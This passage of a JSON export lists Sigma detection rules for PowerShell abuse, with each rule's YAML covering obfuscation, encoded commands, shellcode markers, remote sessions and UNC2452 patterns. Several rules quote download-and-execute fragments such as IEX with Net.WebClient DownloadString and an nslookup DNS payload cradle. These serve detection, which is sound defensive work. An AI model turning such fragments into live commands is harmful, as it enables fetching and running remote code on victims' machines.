                            "raw": "author: Christian Burkard (Nextron Systems), Nasreddine Bencherchali\ndate: 2023/01/30\ndescription: Detects calls to base64 encoded WMI class such as \"Win32_Shadowcopy\",\n  \"\"...etc.\ndetection:\n  condition: selection_img and 1 of selection_cli_*\n  selection_cli_loggedonuser:\n    CommandLine|contains:\n    - VwBpAG4AMwAyAF8ATABvAGcAZwBlAGQATwBuAFUAcwBlAHIA\n    - cAaQBuADMAMgBfAEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByA\n    - XAGkAbgAzADIAXwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcg\n    - V2luMzJfTG9nZ2VkT25Vc2Vy\n    - dpbjMyX0xvZ2dlZE9uVXNlc\n    - XaW4zMl9Mb2dnZWRPblVzZX\n  selection_cli_process:\n    CommandLine|contains:\n    - VwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcw\n    - cAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMA\n    - XAGkAbgAzADIAXwBQAHIAbwBjAGUAcwBzA\n    - V2luMzJfUHJvY2Vzc\n    - dpbjMyX1Byb2Nlc3\n    - XaW4zMl9Qcm9jZXNz\n  selection_cli_scheduledJob:\n    CommandLine|contains:\n    - VwBpAG4AMwAyAF8AUwBjAGgAZQBkAHUAbABlAGQASgBvAGIA\n    - cAaQBuADMAMgBfAFMAYwBoAGUAZAB1AGwAZQBkAEoAbwBiA\n    - XAGkAbgAzADIAXwBTAGMAaABlAGQAdQBsAGUAZABKAG8AYg\n    - V2luMzJfU2NoZWR1bGVkSm9i\n    - dpbjMyX1NjaGVkdWxlZEpvY\n    - XaW4zMl9TY2hlZHVsZWRKb2\n  selection_cli_shadowcopy:\n    CommandLine|contains:\n    - VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQ\n    - cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkA\n    - XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5A\n    - V2luMzJfU2hhZG93Y29we\n    - dpbjMyX1NoYWRvd2NvcH\n    - XaW4zMl9TaGFkb3djb3B5\n  selection_cli_useraccount:\n    CommandLine|contains:\n    - VwBpAG4AMwAyAF8AVQBzAGUAcgBBAGMAYwBvAHUAbgB0A\n    - cAaQBuADMAMgBfAFUAcwBlAHIAQQBjAGMAbwB1AG4AdA\n    - XAGkAbgAzADIAXwBVAHMAZQByAEEAYwBjAG8AdQBuAHQA\n    - V2luMzJfVXNlckFjY291bn\n    - dpbjMyX1VzZXJBY2NvdW50\n    - XaW4zMl9Vc2VyQWNjb3Vud\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Unknown\nid: 1816994b-42e1-4fb1-afd2-134d88184f71\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\nrelated:\n- id: 47688f1b-9f51-4656-b013-3cc49a166a36\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027\ntitle: PowerShell Base64 Encoded WMI Classes\n",
                            "sigma:id": "1816994b-42e1-4fb1-afd2-134d88184f71",
                            "title": "PowerShell Base64 Encoded WMI Classes",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1b9dc62e-6e9e-42a3-8990-94d7a10007f7",
                        "lookup_data": {
                            "description": "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014",
                            "raw": "author: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ndescription: Detects all variations of obfuscated powershell IEX invocation code generated\n  by Invoke-Obfuscation framework from the following code block \\u2014\ndetection:\n  condition: selection_iex\n  selection_iex:\n  - ScriptBlockText|re: \\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\[\n  - ScriptBlockText|re: \\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\[\n  - ScriptBlockText|re: \\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\[\n  - ScriptBlockText|re: \\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}\n  - ScriptBlockText|re: \\*mdr\\*\\W\\s*\\)\\.Name\n  - ScriptBlockText|re: \\$VerbosePreference\\.ToString\\(\nfalsepositives:\n- Unknown\nid: 1b9dc62e-6e9e-42a3-8990-94d7a10007f7\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Obfuscated IEX Invocation - PowerShell\n",
                            "sigma:id": "1b9dc62e-6e9e-42a3-8990-94d7a10007f7",
                            "title": "Invoke-Obfuscation Obfuscated IEX Invocation - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
                        "lookup_data": {
                            "description": "Detects suspicious .NET assembly executions",
                            "raw": "author: omkar72, oscd.community\ndate: 2020/10/12\ndescription: Detects suspicious .NET assembly executions\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|contains:\n    - mshta\n    - cscript\n    - wscript\n    - regsvr32\n    - wmic\n    TargetFilename|contains|all:\n    - \\AppData\\Local\\Microsoft\\CLR\n    - \\UsageLogs\\\nfalsepositives:\n- Unknown\nid: e4b63079-6198-405c-abd7-3fe8b0ce3263\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspcious CLR Logs Creation\n",
                            "sigma:id": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
                            "title": "Suspcious CLR Logs Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "86b896ba-ffa1-4fea-83e3-ee28a4c915c7",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via Stdin in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/12\ndescription: Detects Obfuscated Powershell via Stdin in Scripts\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|re: (?i).*(set).*&&\\s?set.*(environment|invoke|\\$\\{?input).*&&.*\"\nfalsepositives:\n- Unknown\nid: 86b896ba-ffa1-4fea-83e3-ee28a4c915c7\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Stdin - Powershell\n",
                            "sigma:id": "86b896ba-ffa1-4fea-83e3-ee28a4c915c7",
                            "title": "Invoke-Obfuscation Via Stdin - Powershell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7eedcc9d-9fdb-4d94-9c54-474e8affc0c7",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via COMPRESS OBFUSCATION\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - system.io.compression.deflatestream\n    - system.io.streamreader\n    - readtoend(\n    CommandLine|contains|all:\n    - new-object\n    - text.encoding]::ascii\nfalsepositives:\n- Unknown\nid: 7eedcc9d-9fdb-4d94-9c54-474e8affc0c7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation COMPRESS OBFUSCATION\n",
                            "sigma:id": "7eedcc9d-9fdb-4d94-9c54-474e8affc0c7",
                            "title": "Invoke-Obfuscation COMPRESS OBFUSCATION",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "74403157-20f5-415d-89a7-c505779585cf",
                        "lookup_data": {
                            "description": "Detects usage of the \"ConvertTo-SecureString\" cmdlet via the commandline. Which is fairly uncommon and could indicate potential suspicious activity",
                            "raw": "author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton\ndate: 2020/10/11\ndescription: Detects usage of the \"ConvertTo-SecureString\" cmdlet via the commandline.\n  Which is fairly uncommon and could indicate potential suspicious activity\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: ConvertTo-SecureString\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Legitimate use to pass password to different powershell commands\nid: 74403157-20f5-415d-89a7-c505779585cf\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/02/01\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65\n- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.3#examples\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: ConvertTo-SecureString Cmdlet Usage Via CommandLine\n",
                            "sigma:id": "74403157-20f5-415d-89a7-c505779585cf",
                            "title": "ConvertTo-SecureString Cmdlet Usage Via CommandLine",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6331d09b-4785-4c13-980f-f96661356249",
                        "lookup_data": {
                            "description": "Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0",
                            "raw": "author: Florian Roth (Nextron Systems), Lee Holmes (idea), Harish Segar (improvements)\ndate: 2017/03/22\ndescription: Detects PowerShell downgrade attack by comparing the host versions with\n  the actually used engine version 2.0\ndetection:\n  condition: selection and not filter\n  filter:\n    HostVersion|startswith: '2.'\n  selection:\n    EngineVersion|startswith: '2.'\nfalsepositives:\n- Unknown\nid: 6331d09b-4785-4c13-980f-f96661356249\nlevel: medium\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/12/02\nreferences:\n- http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Downgrade Attack - PowerShell\n",
                            "sigma:id": "6331d09b-4785-4c13-980f-f96661356249",
                            "title": "PowerShell Downgrade Attack - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e6c54d94-498c-4562-a37c-b469d8e9a275",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/28\ndescription: Detects suspicious PowerShell download patterns that are often used in\n  malicious scripts, stagers or downloaders (make sure that your backend applies the\n  strings case-insensitive)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - IEX ((New-Object Net.WebClient).DownloadString\n    - IEX (New-Object Net.WebClient).DownloadString\n    - IEX((New-Object Net.WebClient).DownloadString\n    - IEX(New-Object Net.WebClient).DownloadString\n    - ' -command (New-Object System.Net.WebClient).DownloadFile('\n    - ' -c (New-Object System.Net.WebClient).DownloadFile('\nfalsepositives:\n- Software installers that pull packages from remote systems and execute them\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/01\nreferences:\n- https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n- https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nrelated:\n- id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Download and Execute Pattern\n",
                            "sigma:id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
                            "title": "Suspicious PowerShell Download and Execute Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "867613fb-fa60-4497-a017-a82df74a172c",
                        "lookup_data": {
                            "description": "Detects execution of PowerShell",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/09/12\ndescription: Detects execution of PowerShell\ndetection:\n  condition: selection\n  selection:\n    Description: System.Management.Automation\n    ImageLoaded|contains: System.Management.Automation\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- Image\n- ProcessID\n- ImageLoaded\nid: 867613fb-fa60-4497-a017-a82df74a172c\nlevel: medium\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2019/11/10\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1086\n- attack.t1059.001\ntitle: PowerShell Execution\n",
                            "sigma:id": "867613fb-fa60-4497-a017-a82df74a172c",
                            "title": "PowerShell Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1f49f2ab-26bc-48b3-96cc-dcffbc93eadf",
                        "lookup_data": {
                            "description": "Detects keywords that could indicate the use of some PowerShell exploitation framework",
                            "raw": "author: Florian Roth (Nextron Systems), Perez Diego (@darkquassar)\ndate: 2019/02/11\ndescription: Detects keywords that could indicate the use of some PowerShell exploitation\n  framework\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - System.Reflection.Assembly.Load($\n    - '[System.Reflection.Assembly]::Load($'\n    - '[Reflection.Assembly]::Load($'\n    - System.Reflection.AssemblyName\n    - Reflection.Emit.AssemblyBuilderAccess\n    - Runtime.InteropServices.DllImportAttribute\n    - SuspendThread\n    - rundll32\nfalsepositives:\n- Unknown\nid: 1f49f2ab-26bc-48b3-96cc-dcffbc93eadf\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/02\nreferences:\n- https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462\n- https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/CodeExecution/Invoke-ReflectivePEInjection.ps1\n- https://github.com/hlldz/Phant0m/blob/30c2935d8cf4aafda17ee2fab7cd0c4aa9a607c2/old/Invoke-Phant0m.ps1\n- https://gist.github.com/MHaggis/0dbe00ad401daa7137c81c99c268cfb7\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Keywords\n",
                            "sigma:id": "1f49f2ab-26bc-48b3-96cc-dcffbc93eadf",
                            "title": "Suspicious PowerShell Keywords",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "96b9f619-aa91-478f-bacb-c3e50f8df575",
                        "lookup_data": {
                            "description": "Detects remote PowerShell sessions",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g, Tim Shelton\ndate: 2019/08/10\ndescription: Detects remote PowerShell sessions\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_pwsh_archive:\n    ContextInfo|contains: \\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psm1\n  selection:\n    ContextInfo|contains|all:\n    - ' = ServerRemoteHost '\n    - wsmprovhost.exe\nfalsepositives:\n- Legitimate use remote PowerShell sessions\nid: 96b9f619-aa91-478f-bacb-c3e50f8df575\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/20\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.lateral_movement\n- attack.t1021.006\ntitle: Remote PowerShell Session (PS Module)\n",
                            "sigma:id": "96b9f619-aa91-478f-bacb-c3e50f8df575",
                            "title": "Remote PowerShell Session (PS Module)",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "88a22f69-62f9-4b8a-aa00-6b0212f2f05a",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Rundll32 in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2019/10/08\ndescription: Detects Obfuscated Powershell via use Rundll32 in Scripts\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|contains:\n    - value\n    - invoke\n    - comspec\n    - iex\n    Payload|contains|all:\n    - '&&'\n    - rundll32\n    - shell32.dll\n    - shellexec_rundll\nfalsepositives:\n- Unknown\nid: 88a22f69-62f9-4b8a-aa00-6b0212f2f05a\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: a5a30a6e-75ca-4233-8b8c-42e0f2037d3b\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Rundll32 - PowerShell Module\n",
                            "sigma:id": "88a22f69-62f9-4b8a-aa00-6b0212f2f05a",
                            "title": "Invoke-Obfuscation Via Use Rundll32 - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "16b37b70-6fcf-4814-a092-c36bd3aafcbd",
                        "lookup_data": {
                            "description": "Detects Base64 encoded Shellcode",
                            "raw": "author: David Ledbetter (shellcode), Florian Roth (Nextron Systems)\ndate: 2018/11/17\ndescription: Detects Base64 encoded Shellcode\ndetection:\n  condition: selection and selection2\n  selection:\n    ScriptBlockText|contains: AAAAYInlM\n  selection2:\n    ScriptBlockText|contains:\n    - OiCAAAAYInlM\n    - OiJAAAAYInlM\nfalsepositives:\n- Unknown\nid: 16b37b70-6fcf-4814-a092-c36bd3aafcbd\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/cyb3rops/status/1063072865992523776\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell ShellCode\n",
                            "sigma:id": "16b37b70-6fcf-4814-a092-c36bd3aafcbd",
                            "title": "PowerShell ShellCode",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c539afac-c12a-46ed-b1bd-5a5567c9f045",
                        "lookup_data": {
                            "description": "Detects remote PowerShell connections by monitoring network outbound connections to ports 5985 or 5986 from a non-network service account.",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/09/12\ndescription: Detects remote PowerShell connections by monitoring network outbound\n  connections to ports 5985 or 5986 from a non-network service account.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_generic:\n  - User|contains:\n    - NETWORK SERVICE\n    - NETZWERKDIENST\n    - SERVIZIO DI RETE\n    - SERVICIO DE RED\n  - User|contains|all:\n    - SERVICE R\n    - SEAU\n  - SourceIp|startswith: '0:0:'\n  - Image:\n    - C:\\Program Files\\Avast Software\\Avast\\AvastSvc.exe\n    - C:\\Program Files (x86)\\Avast Software\\Avast\\AvastSvc.exe\n  filter_localhost:\n    DestinationIp:\n    - ::1\n    - 127.0.0.1\n    SourceIp:\n    - ::1\n    - 127.0.0.1\n  selection:\n    DestinationPort:\n    - 5985\n    - 5986\n    Initiated: 'true'\nfalsepositives:\n- Legitimate usage of remote PowerShell, e.g. remote administration and monitoring.\n- Network Service user name of a not-covered localization\nid: c539afac-c12a-46ed-b1bd-5a5567c9f045\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2023/01/09\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.lateral_movement\n- attack.t1021.006\ntitle: Remote PowerShell Session (Network)\n",
                            "sigma:id": "c539afac-c12a-46ed-b1bd-5a5567c9f045",
                            "title": "Remote PowerShell Session (Network)",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6385697e-9f1b-40bd-8817-f4a91f40508e",
                        "lookup_data": {
                            "description": "Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls",
                            "raw": "author: pH-T (Nextron Systems), Harjot Singh, '@cyb3rjy0t'\ndate: 2022/05/20\ndescription: Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - SQBuAHYAbwBrAGUALQ\n    - kAbgB2AG8AawBlAC0A\n    - JAG4AdgBvAGsAZQAtA\n    - SW52b2tlL\n    - ludm9rZS\n    - JbnZva2Ut\nfalsepositives:\n- Unlikely\nid: 6385697e-9f1b-40bd-8817-f4a91f40508e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/27\nreferences:\n- https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nrelated:\n- id: fd6e2919-3936-40c9-99db-0aa922c356f7\n  type: obsoletes\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027\ntitle: PowerShell Base64 Encoded Invoke Keyword\n",
                            "sigma:id": "6385697e-9f1b-40bd-8817-f4a91f40508e",
                            "title": "PowerShell Base64 Encoded Invoke Keyword",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "641a4bfb-c017-44f7-800c-2aee0184ce9b",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Rundll32 in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use Rundll32 in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - value\n    - invoke\n    - comspec\n    - iex\n    ImagePath|contains|all:\n    - '&&'\n    - rundll32\n    - shell32.dll\n    - shellexec_rundll\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 641a4bfb-c017-44f7-800c-2aee0184ce9b\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Rundll32 - System\n",
                            "sigma:id": "641a4bfb-c017-44f7-800c-2aee0184ce9b",
                            "title": "Invoke-Obfuscation Via Use Rundll32 - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "61d0475c-173f-4844-86f7-f3eebae1c66b",
                        "lookup_data": {
                            "description": "Detects use of Set-ExecutionPolicy to set insecure policies",
                            "raw": "author: frack113\ndate: 2021/10/20\ndescription: Detects use of Set-ExecutionPolicy to set insecure policies\ndetection:\n  cmdlet:\n    ScriptBlockText|contains: Set-ExecutionPolicy\n  condition: cmdlet and option and not filter\n  filter:\n    ScriptBlockText|contains:\n    - (New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')\n    - (New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')\n    - \\AppData\\Roaming\\Code\\\n  option:\n    ScriptBlockText|contains:\n    - Unrestricted\n    - bypass\n    - RemoteSigned\nfalsepositives:\n- Administrator script\nid: 61d0475c-173f-4844-86f7-f3eebae1c66b\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.1\n- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1\n- https://adsecurity.org/?p=2604\nrelated:\n- id: cf2e938e-9a3e-4fe8-a347-411642b28a9f\n  type: similar\n- id: 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180\n  type: similar\n- id: fad91067-08c5-4d1a-8d8c-d96a21b37814\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Change PowerShell Policies to an Insecure Level - PowerShell\n",
                            "sigma:id": "61d0475c-173f-4844-86f7-f3eebae1c66b",
                            "title": "Change PowerShell Policies to an Insecure Level - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
                        "lookup_data": {
                            "description": "Detects suspicious powershell download cradle using nslookup. This cradle uses nslookup to extract payloads from DNS records",
                            "raw": "author: Sai Prashanth Pulisetti @pulisettis\ndate: 2022/12/10\ndescription: Detects suspicious powershell download cradle using nslookup. This cradle\n  uses nslookup to extract payloads from DNS records\ndetection:\n  condition: selection\n  selection:\n    HostApplication|contains:\n    - -q=txt\n    - -querytype=txt\n    HostApplication|contains|all:\n    - powershell\n    - nslookup\nfalsepositives:\n- Unknown\nid: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1\nlevel: medium\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/12/19\nreferences:\n- https://twitter.com/Alh4zr3d/status/1566489367232651264\nrelated:\n- id: 1b3b01c7-84e9-4072-86e5-fc285a41ff23\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Nslookup PowerShell Download Cradle\n",
                            "sigma:id": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
                            "title": "Nslookup PowerShell Download Cradle",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f",
                        "lookup_data": {
                            "description": "Detects a specific process creation patterns as seen used by UNC2452 and provided by Microsoft as Microsoft Defender ATP queries",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/01/22\ndescription: Detects a specific process creation patterns as seen used by UNC2452\n  and provided by Microsoft as Microsoft Defender ATP queries\ndetection:\n  condition: 1 of selection_* or ( specific1 and not filter1 )\n  filter1:\n    CommandLine:\n    - ' '\n    - ''\n  selection_1:\n    CommandLine|contains: 7z.exe a -v500m -mx9 -r0 -p\n  selection_2:\n    CommandLine|contains|all:\n    - rundll32.exe\n    - C:\\Windows\n    - .dll,Tk_\n    ParentCommandLine|contains|all:\n    - wscript.exe\n    - .vbs\n  selection_3:\n    CommandLine|contains: 'cmd.exe /C '\n    ParentCommandLine|contains: C:\\Windows\n    ParentImage|endswith: \\rundll32.exe\n  selection_4:\n    CommandLine|contains|all:\n    - rundll32 c:\\windows\\\n    - '.dll '\n  specific1:\n    Image|endswith: \\dllhost.exe\n    ParentImage|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/18\nreferences:\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: UNC2452 Process Creation Patterns\n",
                            "sigma:id": "9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f",
                            "title": "UNC2452 Process Creation Patterns",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bbb80e91-5746-4fbe-8898-122e2cafdbf4",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell invocation command parameters",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/12\ndescription: Detects suspicious PowerShell invocation command parameters\ndetection:\n  condition: all of selection*\n  selection_encoded:\n    ContextInfo|contains:\n    - ' -enc '\n    - ' -EncodedCommand '\n    - ' -ec '\n  selection_hidden:\n    ContextInfo|contains:\n    - ' -w hidden '\n    - ' -window hidden '\n    - ' -windowstyle hidden '\n    - ' -w 1 '\n  selection_noninteractive:\n    ContextInfo|contains:\n    - ' -noni '\n    - ' -noninteractive '\nfalsepositives:\n- Very special / sneaky PowerShell scripts\nid: bbb80e91-5746-4fbe-8898-122e2cafdbf4\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/03\nrelated:\n- id: 3d304fda-78aa-43ed-975c-d740798a49c1\n  type: derived\n- id: ed965133-513f-41d9-a441-e38076a0798f\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Invocations - Generic - PowerShell Module\n",
                            "sigma:id": "bbb80e91-5746-4fbe-8898-122e2cafdbf4",
                            "title": "Suspicious PowerShell Invocations - Generic - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4c54ba8f-73d2-4d40-8890-d9cf1dca3d30",
                        "lookup_data": {
